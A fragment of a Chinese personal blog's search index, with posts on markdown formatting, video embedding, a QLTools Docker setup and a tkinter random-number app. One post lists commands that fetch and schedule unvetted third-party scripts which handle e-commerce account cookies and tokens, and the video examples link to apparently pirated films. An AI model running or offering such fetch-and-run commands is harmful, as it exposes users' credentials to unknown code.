      </tags>
  </entry>
  <entry>
    <title>markdown 文档常用字体及颜色设置</title>
    <url>/posts/c4633040/</url>
    <content><![CDATA[<p>1、字体、字号、颜色设置</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;微软雅黑&quot;</span> &gt;</span></span>微软雅黑字体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span> &gt;</span></span>黑体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">3</span> &gt;</span></span>3号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">4</span> &gt;</span></span>4号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#FF0000</span> &gt;</span></span>红色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#008000</span> &gt;</span></span>绿色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#0000FF</span> &gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>上述设置显示效果如下所示：<br><font face="微软雅黑" >微软雅黑字体</font><br><font face="黑体" >黑体</font><br><font size=3 >3号字</font><br><font size=4 >4号字</font><br><font color=#FF0000 >红色</font><br><font color=#008000 >绿色</font><br><font color=#0000FF >蓝色</font></p>
<p>注意：</p>
<p>CSDN中的blog默认字号为3号字，字号数值可设为1~7，默认字体为微软雅黑。其它颜色值可参考 CSDN-markdown编辑器语法——字体、字号与颜色。</p>
<p>字体、字号以及颜色可在&lt;font ……</font>中同时设置，如可对文字“微软雅黑字体”设置格式：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;微软雅黑&quot;</span> <span class="attr">size</span>=<span class="string">6</span> <span class="attr">color</span>=<span class="string">#FF0000</span> &gt;</span></span>微软雅黑字体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>显示效果如下：<br><font face="微软雅黑" size=6 color=#FF0000 >微软雅黑字体</font></p>
<p>2、加粗、斜体设置</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="strong">**粗体文字**</span> 或 <span class="strong">__粗体文字__</span> </span><br></pre></td></tr></table></figure>
<p><strong>粗体文字</strong> 或 <strong>粗体文字</strong> </p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="emphasis">*斜体文字*</span> 或 <span class="emphasis">_斜体文字_</span></span><br></pre></td></tr></table></figure>
<p><em>斜体文字</em> 或 <em>斜体文字</em></p>
<p>3、背景色设置<br>目前csdn博客写作中只能是借助 table, tr, td 等表格标签的 bgcolor 属性来实现背景色的功能。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">orange</span>&gt;</span></span> 背景色是 1 orange<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>= <span class="string">BlueViolet</span> &gt;</span></span> 背景色2 BlueViolet <span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=orange> 背景色是 1 orange</td></tr></table>
<table><tr><td bgcolor= BlueViolet > 背景色2 BlueViolet </td></tr></table>

<p>文章内容和代码来源于<a href="https://blog.csdn.net/houxiaoni01/article/details/118365655">Markdown文档常用字体及颜色设置</a>，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>ip 签名档源码</title>
    <url>/posts/c495223c/</url>
    <content><![CDATA[<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;https://api.szfx.top/info-card/?word=欢迎来到杰哥就爱玩&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<img src="https://api.szfx.top/info-card/?word=欢迎来到杰哥就爱玩"/>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;https://api.szfx.top/ipinfo&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<img src="https://api.szfx.top/ipinfo"/>

]]></content>
      <categories>
        <category>coding</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>coding</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 搭建青龙 tools</title>
    <url>/posts/37862c25/</url>
    <content><![CDATA[<h1 id="创建QLTools目录并进入"><a href="#创建QLTools目录并进入" class="headerlink" title="创建QLTools目录并进入"></a>创建QLTools目录并进入</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> qltools &amp;&amp; <span class="built_in">cd</span> qltools</span><br></pre></td></tr></table></figure>

<h1 id="Docker版本提供架构：amd64、arm64、arm-7"><a href="#Docker版本提供架构：amd64、arm64、arm-7" class="headerlink" title="Docker版本提供架构：amd64、arm64、arm-7"></a>Docker版本提供架构：amd64、arm64、arm-7</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --restart=always -itd --name QLTools -v <span class="variable">$PWD</span>/config:/QLTools/config -v <span class="variable">$PWD</span>/plugin:/QLTools/plugin -p 15000:15000 nuanxinqing123/qltools:latest</span><br></pre></td></tr></table></figure>

<h1 id="注意事项：Docker部署将从v1-7正式版全面支持热更新（v1-6以及以前版本需要手动升级）"><a href="#注意事项：Docker部署将从v1-7正式版全面支持热更新（v1-6以及以前版本需要手动升级）" class="headerlink" title="注意事项：Docker部署将从v1.7正式版全面支持热更新（v1.6以及以前版本需要手动升级）"></a>注意事项：Docker部署将从v1.7正式版全面支持热更新（v1.6以及以前版本需要手动升级）</h1><h1 id="更新步骤：后台点击更新，稍等5分钟左右。手动重启容器即可完成更新（如果更新失败，请删除容器和镜像，然后重新拉取镜像启动）"><a href="#更新步骤：后台点击更新，稍等5分钟左右。手动重启容器即可完成更新（如果更新失败，请删除容器和镜像，然后重新拉取镜像启动）" class="headerlink" title="更新步骤：后台点击更新，稍等5分钟左右。手动重启容器即可完成更新（如果更新失败，请删除容器和镜像，然后重新拉取镜像启动）"></a>更新步骤：后台点击更新，稍等5分钟左右。手动重启容器即可完成更新（如果更新失败，请删除容器和镜像，然后重新拉取镜像启动）</h1><h1 id="更新镜像："><a href="#更新镜像：" class="headerlink" title="更新镜像："></a>更新镜像：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nuanxinqing123/qltools:latest</span><br></pre></td></tr></table></figure>
<h1 id="重启命令："><a href="#重启命令：" class="headerlink" title="重启命令："></a>重启命令：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker restart QLTools</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="后台信息：登录地址：IP或域名-15000-login注册地址：IP或域名-15000-register后台地址：IP或域名-15000-admin"><a href="#后台信息：登录地址：IP或域名-15000-login注册地址：IP或域名-15000-register后台地址：IP或域名-15000-admin" class="headerlink" title="后台信息：登录地址：IP或域名:15000&#x2F;#&#x2F;login注册地址：IP或域名:15000&#x2F;#&#x2F;register后台地址：IP或域名:15000&#x2F;#&#x2F;admin"></a>后台信息：<br>登录地址：IP或域名:15000&#x2F;#&#x2F;login<br>注册地址：IP或域名:15000&#x2F;#&#x2F;register<br>后台地址：IP或域名:15000&#x2F;#&#x2F;admin</h2><h2 id="仓库地址：https-github-com-nuanxinqing123-QLTools开发计划：https-web-banlikanban-com-kanban-626f9b4c6ade1220282ac551提交Bug：https-github-com-nuanxinqing123-QLTools-issues插件库：http-plugin-6b7-org进程守护-反代：https-6b7-org-460-html"><a href="#仓库地址：https-github-com-nuanxinqing123-QLTools开发计划：https-web-banlikanban-com-kanban-626f9b4c6ade1220282ac551提交Bug：https-github-com-nuanxinqing123-QLTools-issues插件库：http-plugin-6b7-org进程守护-反代：https-6b7-org-460-html" class="headerlink" title="仓库地址：https://github.com/nuanxinqing123/QLTools开发计划：https://web.banlikanban.com/kanban/626f9b4c6ade1220282ac551提交Bug：https://github.com/nuanxinqing123/QLTools/issues插件库：http://plugin.6b7.org进程守护&amp;反代：https://6b7.org/460.html"></a>仓库地址：<a href="https://github.com/nuanxinqing123/QLTools">https://github.com/nuanxinqing123/QLTools</a><br>开发计划：<a href="https://web.banlikanban.com/kanban/626f9b4c6ade1220282ac551">https://web.banlikanban.com/kanban/626f9b4c6ade1220282ac551</a><br>提交Bug：<a href="https://github.com/nuanxinqing123/QLTools/issues">https://github.com/nuanxinqing123/QLTools/issues</a><br>插件库：<a href="http://plugin.6b7.org/">http://plugin.6b7.org</a><br>进程守护&amp;反代：<a href="https://6b7.org/460.html">https://6b7.org/460.html</a></h2><p>Github代理站：<br><a href="https://ghproxy.com/">https://ghproxy.com</a><br><a href="https://mirror.ghproxy.com/">https://mirror.ghproxy.com</a><br><a href="https://toolwa.com/github">https://toolwa.com/github</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
        <category>qinglong</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
        <tag>qinglong</tag>
      </tags>
  </entry>
  <entry>
    <title>markdown 基本语法</title>
    <url>/posts/ef5cc648/</url>
    <content><![CDATA[<h1 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h1><h2 id="段落中换行"><a href="#段落中换行" class="headerlink" title="段落中换行"></a>段落中换行</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">床前明月光，<span class="language-xml"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span>疑是地上霜</span><br></pre></td></tr></table></figure>
<p>显示如下：<br>床前明月光，<br />疑是地上霜</p>
<h2 id="普通句子中换行（1）"><a href="#普通句子中换行（1）" class="headerlink" title="普通句子中换行（1）"></a>普通句子中换行（1）</h2><p>使用 \，然后接着按下Enter</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">床前明月光，\</span><br><span class="line">疑是地上霜</span><br></pre></td></tr></table></figure>
<p>显示如下：<br>床前明月光，<br>疑是地上霜</p>
<h2 id="普通句子中换行（2）"><a href="#普通句子中换行（2）" class="headerlink" title="普通句子中换行（2）"></a>普通句子中换行（2）</h2><p>输入两个空格，然后接着按下Enter</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">床前明月光，  </span><br><span class="line">疑是地上霜</span><br></pre></td></tr></table></figure>
<p>显示如下：<br>床前明月光，<br>疑是地上霜</p>
<h1 id="居中对齐，左对齐，右对齐"><a href="#居中对齐，左对齐，右对齐" class="headerlink" title="居中对齐，左对齐，右对齐"></a>居中对齐，左对齐，右对齐</h1><p>Markdown语法本身没有居中，但Markdown中支持基本的HTMl语法，可以使用HTML语法。</p>
<h2 id="居中："><a href="#居中：" class="headerlink" title="居中："></a>居中：</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span>月是故乡明<span class="language-xml"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<center>月是故乡明</center>

<h2 id="左对齐："><a href="#左对齐：" class="headerlink" title="左对齐："></a>左对齐：</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;left&quot;</span>&gt;</span></span>月是故乡明<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p align="left">月是故乡明</p>

<h2 id="右对齐："><a href="#右对齐：" class="headerlink" title="右对齐："></a>右对齐：</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span></span>月是故乡明<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p align="right">月是故乡明</p>]]></content>
      <categories>
        <category>web</category>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 markdown 语言在博客的文章中添加视频</title>
    <url>/posts/b9f1f574/</url>
    <content><![CDATA[<p>Markdown支持HTML的标签，在HTML中我们可以用video标签插入视频，在Markdown中，我们同样可以使用video标签插入视频，具体格式如下： </p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;movie.mp4.mp4&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>用法：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> <span class="language-xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;250&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> <span class="language-xml"><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;movie.ogg&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/ogg&quot;</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> <span class="language-xml"><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;movie.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> 您的浏览器不支持此种视频格式。</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> <span class="language-xml"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>其次，这是对一些参数的说明：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">autoplay :出现该属性意味着视频在就绪后将自动播放，用法：autoplay=&quot;autoplay&quot;</span><br><span class="line"></span><br><span class="line">controls :出现该属性意味着向用户显示控件，如播放按钮等，用法：controls=&quot;controls&quot;</span><br><span class="line"></span><br><span class="line">height:设置高度      width:设置宽度</span><br><span class="line"></span><br><span class="line">loop:自动重播，用法：loop=&quot;loop&quot;</span><br><span class="line"></span><br><span class="line">preload:视频在页面加载时进行加载并预备播放，用法：preload=&quot;auto&quot; - 当页面加载后载入整个视频；preload=&quot;meta&quot; - 当页面加载后只载入元数据；preload=&quot;none&quot; - 当页面加载后不载入视频。注意：若使用了autoplay，则忽略preload</span><br><span class="line"></span><br><span class="line">src:要播放视频的url</span><br></pre></td></tr></table></figure>
<p>示例：<br>第一种：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">&quot;720&quot;</span> <span class="attr">height</span>=<span class="string">&quot;303&quot;</span> <span class="attr">controls</span>&gt;</span></span> #或者：<span class="language-xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width:60</span>% <span class="attr">height:auto</span> <span class="attr">controls</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;https://movie.cy798.cn/%E9%BB%91%E8%B1%B9.Black.Panther.2018.BD720P.X264.AAC.English.CHS-ENG.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>第二种：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;https://movie.cy798.cn/Blue.Planet.S02.2017.BluRay.1080p.DTS-HD.MA5.1.2Audio.x264-CHD/Blue.Planet.S02E01.One.Ocean.2017.BluRay.1080p.DTS-HD.MA5.1.2Audio.x264-CHD.mkv&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">width:100</span>% <span class="attr">height:auto</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>青龙脚本库</title>
    <url>/posts/78197849/</url>
    <content><![CDATA[<p>【JDWXX-非京东任务汇总】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://github.com/JDWXX/ql_all.git <span class="string">&quot;&quot;</span> <span class="string">&quot;Backup|index|HT.*|sendNotify|ql&quot;</span> <span class="string">&quot;HT.*|sendNotify|ql&quot;</span></span><br><span class="line"><span class="comment">#备用</span></span><br><span class="line">ql repo https://hub.fastgit.org/JDWXX/ql_all.git <span class="string">&quot;&quot;</span> <span class="string">&quot;Backup|index|HT.*|sendNotify|ql&quot;</span> <span class="string">&quot;HT.*|sendNotify|ql&quot;</span></span><br></pre></td></tr></table></figure>
<p>【wskey】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://e.coding.net/HelloDNS/sign/wskey.git <span class="string">&quot;wskey&quot;</span></span><br></pre></td></tr></table></figure>
<p>【饿了么】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://gitee.com/xiecoll/radish-script.git <span class="string">&quot;lb_&quot;</span> <span class="string">&quot;README&quot;</span> <span class="string">&quot;sendNotify&quot;</span></span><br></pre></td></tr></table></figure>
<p>【6dylan6】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://github.com/6dylan6/jdpro.git <span class="string">&quot;jd_|jx_|jddj_&quot;</span> <span class="string">&quot;backUp&quot;</span> <span class="string">&quot;^jd[^_]|USER|JD|function|sendNotify&quot;</span></span><br></pre></td></tr></table></figure>
<p>【HarbourToulu】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://github.com/HarbourJ/HarbourToulu.git <span class="string">&quot;jd_|jdCookie&quot;</span> <span class="string">&quot;activity|backUp&quot;</span> <span class="string">&quot;^jd[^_]|USER|utils|ZooFaker_Necklace|JDJRValidator_|sign_graphics_validate|jddj_cookie|function|ql|magic|JDJR|JD|sendNotify&quot;</span> <span class="string">&quot;main&quot;</span></span><br></pre></td></tr></table></figure>
<p>【快手极速版】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql raw https://gitee.com/wj0570/wj0570/raw/wj0570/ks_jsb.js</span><br></pre></td></tr></table></figure>
<p>【今日头条极速版】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql raw https://raw.githubusercontent.com/Herman-Xu/qinglong/main/jrttjsb.js</span><br></pre></td></tr></table></figure>
<p>【Faker3】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://github.com/shufflewzc/faker3.git <span class="string">&quot;jd_|jx_|gua_|jddj_|jdCookie&quot;</span> <span class="string">&quot;activity|backUp&quot;</span> <span class="string">&quot;^jd[^_]|USER|function|utils|sendNotify|ZooFaker_Necklace.js|JDJRValidator_|sign_graphics_validate|ql|JDSignValidator&quot;</span> <span class="string">&quot;main&quot;</span></span><br></pre></td></tr></table></figure>
<p>【JDHelp】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://github.com/he1pu/JDHelp.git <span class="string">&quot;jd_|jx_|getJDCookie&quot;</span> <span class="string">&quot;activity|backUp|jd_delCoupon&quot;</span> <span class="string">&quot;^jd[^_]|USER|utils|sendNotify|ZooFaker_Necklace.js|JDJRValidator_|sign_graphics_validate&quot;</span></span><br></pre></td></tr></table></figure>
<p>【京东KingRan】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://hub.fastgit.xyz/KingRan/KR.git <span class="string">&quot;jd_|jx_|jdCookie&quot;</span> <span class="string">&quot;activity|backUp&quot;</span> <span class="string">&quot;^jd[^_]|USER|utils|function|sign|sendNotify|ql|JDJR&quot;</span></span><br></pre></td></tr></table></figure>
<p>【JD仓库】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://github.91chi.fun//https://github.com/FengYun27/YunFeng_Repo.git <span class="string">&quot;jd_&quot;</span> <span class="string">&quot;expire&quot;</span> <span class="string">&quot;ql|sendNotify|utils|USER_AGENTS|jdCookie|TS_USER_AGENTS|sign_graphics_validate&quot;</span></span><br></pre></td></tr></table></figure>
<p>【羊毛仓库】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ql repo https://github.91chi.fun//https://github.com/FengYun27/Sheep_Hair.git <span class="string">&quot;m_&quot;</span> <span class="string">&quot;expire&quot;</span> <span class="string">&quot;ql|sendNotify|root|untitled&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tools</category>
        <category>qinglong</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>qinglong</tag>
      </tags>
  </entry>
  <entry>
    <title>随机数生成器2.0新增提示弹窗</title>
    <url>/posts/c4d9ddb/</url>
    <content><![CDATA[<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">win = tk.Tk()</span><br><span class="line">win.title(<span class="string">&#x27;随机整数生成器&#x27;</span>)</span><br><span class="line">winWidth = <span class="number">550</span></span><br><span class="line">winHeight = <span class="number">330</span></span><br><span class="line">t0 = tk.Label(win, text=<span class="string">&#x27;下方输入最小值和最大值&#x27;</span>, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">25</span>, height=<span class="number">2</span>)</span><br><span class="line">t0.grid(row=<span class="number">0</span>, column=<span class="number">1</span>)</span><br><span class="line">t1 = tk.Label(win, text=<span class="string">&#x27;最小值:&#x27;</span>, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">10</span>, height=<span class="number">2</span>, )</span><br><span class="line">t1.grid(row=<span class="number">1</span>, column=<span class="number">0</span>)</span><br><span class="line">e1 = tk.Entry(win, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">20</span>, justify=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">e1.grid(row=<span class="number">1</span>, column=<span class="number">1</span>)</span><br><span class="line">t2 = tk.Label(win, text=<span class="string">&#x27;最大值:&#x27;</span>, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">10</span>, height=<span class="number">2</span>)</span><br><span class="line">t2.grid(row=<span class="number">2</span>, column=<span class="number">0</span>)</span><br><span class="line">e2 = tk.Entry(win, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">20</span>, justify=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">e2.grid(row=<span class="number">2</span>, column=<span class="number">1</span>)</span><br><span class="line">t3 = tk.Label(win, text=<span class="string">&#x27;随机值:&#x27;</span>, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">20</span>, height=<span class="number">2</span>)</span><br><span class="line">t3.grid(row=<span class="number">3</span>, column=<span class="number">0</span>)</span><br><span class="line">t4 = tk.Label(win, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">20</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">t4.grid(row=<span class="number">3</span>, column=<span class="number">1</span>)</span><br><span class="line">t5 = tk.Label(win, text=<span class="string">&#x27;Made by Macin&#x27;</span>, font=<span class="string">&quot;微软雅黑 10&quot;</span>, width=<span class="number">25</span>, height=<span class="number">2</span>)</span><br><span class="line">t5.grid(row=<span class="number">0</span>, column=<span class="number">0</span>)</span><br><span class="line">t6 = tk.Label(win, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">20</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">t7 = tk.Label(win, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">20</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">var = tk.StringVar()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取屏幕分辨率</span></span><br><span class="line">screenWidth = win.winfo_screenwidth()</span><br><span class="line">screenHeight = win.winfo_screenheight()</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">int</span>((screenWidth - winWidth) / <span class="number">2</span>)</span><br><span class="line">y = <span class="built_in">int</span>((screenHeight - winHeight) / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置窗口初始位置在屏幕居中</span></span><br><span class="line">win.geometry(<span class="string">&quot;%sx%s+%s+%s&quot;</span> % (winWidth, winHeight, x, y))</span><br><span class="line"><span class="comment"># 禁止拉伸窗口大小</span></span><br><span class="line">win.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">win.iconbitmap(<span class="string">&#x27;6.ico&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># win.wm_attributes(&quot;-alpha&quot;, 1)        # 透明度(0.0~1.0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num</span>():</span><br><span class="line">    x = e1.get()</span><br><span class="line">    y = e2.get()</span><br><span class="line">    t6[<span class="string">&quot;text&quot;</span>] = <span class="built_in">str</span>(<span class="built_in">str</span>.isdigit(x))</span><br><span class="line">    t7[<span class="string">&quot;text&quot;</span>] = <span class="built_in">str</span>(<span class="built_in">str</span>.isdigit(y))</span><br><span class="line">    <span class="keyword">if</span> t6[<span class="string">&quot;text&quot;</span>] == <span class="string">&quot;True&quot;</span> <span class="keyword">and</span> t7[<span class="string">&quot;text&quot;</span>] == <span class="string">&quot;True&quot;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showinfo(<span class="string">&#x27;提示&#x27;</span>, <span class="string">&#x27;我只认识正整数&#x27;</span>)</span><br><span class="line">        e1.delete(<span class="number">0</span>, <span class="string">&quot;end&quot;</span>)</span><br><span class="line">        e1.insert(<span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        e2.delete(<span class="number">0</span>, <span class="string">&quot;end&quot;</span>)</span><br><span class="line">        e2.insert(<span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ran</span>():</span><br><span class="line">    x = e1.get()</span><br><span class="line">    y = e2.get()</span><br><span class="line">    a = random.randint(<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line">    t4[<span class="string">&quot;text&quot;</span>] = <span class="built_in">str</span>(a)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">butt = tk.Button(win, text=<span class="string">&#x27;开始&#x27;</span>, font=<span class="string">&quot;微软雅黑 15&quot;</span>, width=<span class="number">10</span>, height=<span class="number">2</span>, command=<span class="keyword">lambda</span>: [num(), ran()])</span><br><span class="line">butt.grid(row=<span class="number">9</span>, column=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">win.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>coding</category>
        <category>python3</category>
      </categories>
      <tags>
        <tag>coding</tag>
